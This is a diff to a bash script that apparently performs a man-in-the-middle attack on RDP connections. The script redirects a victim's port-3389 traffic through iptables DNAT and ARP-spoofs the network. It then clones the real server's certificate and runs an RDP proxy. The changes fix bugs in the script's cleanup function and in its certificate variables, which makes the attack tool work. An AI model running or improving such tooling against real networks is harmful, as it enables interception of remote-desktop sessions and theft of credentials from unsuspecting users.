@@ -22,10 +22,10 @@ IPTABLES_PARAMETERS="PREROUTING -p tcp -s $VICTIM_IP --dport 3389 -j DNAT --to-d
 
 function finish {
     echo "[*] Cleaning up..."
-    exec iptables -t nat -D $IPTABLES_PARAMETERS
+    iptables -t nat -D $IPTABLES_PARAMETERS
     printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
     kill $ARP_PID_1 $ARP_PID_2
-    kill -- -$$
+    pkill -P $$
     echo "[*] Done."
 }
 trap finish EXIT
@@ -50,12 +50,15 @@ echo "[+] Got it! Original destination is $ORIGINAL_DEST"
 echo "[*] Clone the x509 certificate of the original destination..."
 
 CERT_KEY="$($SCRIPT_DIR/clone-cert.sh "$ORIGINAL_DEST:3389")"
-KEYPATH="$(printf "%s" "$CERTPATH" | head -n1)"
-CERTPATH="$(printf "%s" "$CERTPATH" | tail -n1)"
+KEYPATH="$(printf "%s" "$CERT_KEY" | head -n1)"
+CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"
+
+echo "[*] Turning on IP forwarding..."
+
+iptables -t nat -A $IPTABLES_PARAMETERS
 
 echo "[*] Set iptables rules..."
 
-exec iptables -t nat -A $IPTABLES_PARAMETERS
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "[*] Run RDP proxy..."
